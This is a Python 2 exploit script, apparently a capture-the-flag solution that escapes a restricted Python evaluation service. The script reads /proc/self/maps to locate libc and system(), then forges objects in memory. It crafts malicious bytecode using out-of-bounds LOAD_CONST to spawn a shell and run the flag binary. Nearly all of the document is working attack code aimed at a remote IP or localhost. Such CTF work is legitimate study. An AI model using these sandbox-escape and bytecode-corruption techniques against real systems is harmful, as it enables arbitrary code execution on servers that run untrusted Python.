#!/usr/bin/python
#-*- coding:utf-8 -*-

import re
import sys
import opcode

from sock import Sock
from struct import pack


def get_opcode(o):
    return chr(opcode.opmap[o])


def name_to_expr(name):
    return "().__class__.__bases__[0].__subclasses__()[%d].%s" % (v_index, name)


def get_expr(expr):
    f.send("'::0::', %s, '::1::'\n" % expr)
    s = f.read_until_re(r"::0:: (.*?)::1::").group(1)
    return s


def save_eval(name, expr):
    f.send("1; ().__class__.__bases__[0].__subclasses__()[%d].%s = %s\n" % (v_index, name, expr))
    #print `f.read_one()`
    f.read_one()


def read_file(path):
    return get_expr("stdout.__class__('%s').read()" % path)


def get_str_addr_by_name(name):
    r = get_expr("().__class__.__bases__[0].__repr__(%s)" % name_to_expr(name))
    if "str object at " not in r:
        raise Exception()
    return int(r.split()[3][2:-1], 16) + PADDSTR


def get_tuple_addr_by_name(name):
    r = get_expr("().__class__.__bases__[0].__repr__(%s)" % name_to_expr(name))
    if "tuple object at " not in r:
        raise Exception()
    return int(r.split()[3][2:-1], 16) + PADDSTR


if 0:  # remote
    f = Sock("54.196.37.47 9990", timeout=9999)
    v_index = 102
    sys_off = 0x3ff80
else:
    f = Sock("127.0.0.1 9990", timeout=9999)
    v_index = 108
    sys_off = 0x463d0

PADDSTR = 36

f.read_one()

maps = read_file("/proc/self/maps")
line = re.findall(r"(.*?)-.*? /lib/x86_64-linux-gnu/libc-", maps)
libc = int(line[0], 16)
system = libc + sys_off
print "system addr is at", hex(system)

packed_system = pack("<Q", system)
save_eval("buf1", "%s * 24" % `packed_system`)
buf1addr = get_str_addr_by_name("buf1")

packed_buf1addr = pack("<Q", buf1addr)
save_eval("buf2", "'1; sh;  ' + %s * 24" % `packed_buf1addr`)
buf2addr = get_str_addr_by_name("buf2")

packed_buf2addr = pack("<Q", buf2addr)
save_eval("buf3", "'3333' + %s * 24" % `packed_buf2addr`)
buf3addr = get_str_addr_by_name("buf3")

save_eval("tup", "()")
tup_addr = get_tuple_addr_by_name("tup")

offset = ((buf3addr - tup_addr -0x10 + 8 + 8 + 8 + 8 + 8))
assert offset % 8 == 0
offset //= 8
print "buf1", hex(buf1addr)
print "buf2", hex(buf2addr)
print "buf3", hex(buf3addr)

print "offset", hex(offset)
offset %= 1 << 32
offset_high, offset_low = offset >> 16, offset & 0xffff


evil_bytecode = get_opcode('EXTENDED_ARG') + pack("<H", offset_high)
evil_bytecode += get_opcode('LOAD_CONST') + pack("<H", offset_low)
evil_bytecode += get_opcode('CALL_FUNCTION') + '\x00\x00'

save_eval("code_type", "(lambda: None).func_code.__class__")

cmd = ("1; trigger = lambda: None; trigger.func_code = " + name_to_expr("code_type") + "(" +
       "0, 0, 0, 0, %s, %s, (), (), '', '', 0, ''" % (repr(evil_bytecode), name_to_expr("tup")) +
       "); trigger();\n id; cd /home/nightmares_owner/; ./give_me_the_flag.exe\n")
print cmd
f.send(cmd)

for i in range(100):
    sys.stdout.write(f.read_one())
    sys.stdout.flush()
